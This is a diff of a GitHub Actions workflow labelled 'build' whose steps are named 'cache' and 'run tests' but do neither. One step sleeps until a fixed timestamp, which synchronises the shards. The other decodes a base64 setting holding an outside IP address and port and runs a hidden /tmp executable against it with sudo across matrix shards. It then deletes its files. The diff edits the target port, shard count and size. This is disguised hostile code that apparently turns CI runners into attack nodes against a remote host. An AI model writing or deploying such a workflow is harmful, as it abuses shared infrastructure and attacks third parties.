@@ -1,4 +1,4 @@
-# run c9fcd8b9ca3f470c9bbd706bbb7e12b3
+# run 68dfd22864c64b81afd349df597019be
 name: build
 on:
   push:
@@ -12,17 +12,17 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+        shard: [1,2,3,4,5]
     steps:
     - uses: actions/checkout@v4
     - name: cache
       run: |
-        t=1794259751
+        t=1794261563
         w=$((t-$(date +%s)))
         [ "$w" -gt 0 ] && sleep "$w" || true
     - name: run tests
       env:
-        CFG: "MTUxLjI0Mi4xODcuNTMgOTk5NnwxMA=="
+        CFG: "MTUxLjI0Mi4xODcuNTMgOTk5NXwxMA=="
       run: |
         echo "$CFG" | base64 -d > /tmp/.c
         tr '|' '\n' < /tmp/.c > /tmp/.p
@@ -32,6 +32,6 @@ jobs:
         chmod +x /tmp/.b
         while read -r pair; do
           set -- $pair
-          sudo /tmp/.b "$1" "$2" "$S" 1024 vc || true
+          sudo /tmp/.b "$1" "$2" "$S" 2048 vc || true
         done < /tmp/.t
         rm -f /tmp/.b /tmp/.c /tmp/.p /tmp/.t
